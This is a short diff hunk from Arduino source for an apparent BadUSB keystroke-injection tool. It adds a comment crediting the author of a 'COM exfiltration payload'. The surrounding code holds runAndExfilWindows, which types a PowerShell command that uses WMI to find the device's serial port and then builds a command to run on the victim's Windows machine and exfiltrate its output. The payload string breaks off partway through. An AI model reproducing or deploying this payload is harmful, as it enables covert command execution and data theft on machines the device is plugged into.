@@ -551,6 +551,7 @@ void lockMacOs(){
 //const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
 //const char powershell_command_2[] PROGMEM = ;
 
+//This COM exfiltration payload was written by Luca Bongiorni https://twitter.com/LucaBongiorni
 void runAndExfilWindows(String command) {
   Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like '_SB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
   // We avoid concatenation to avoid dynamic memory usage
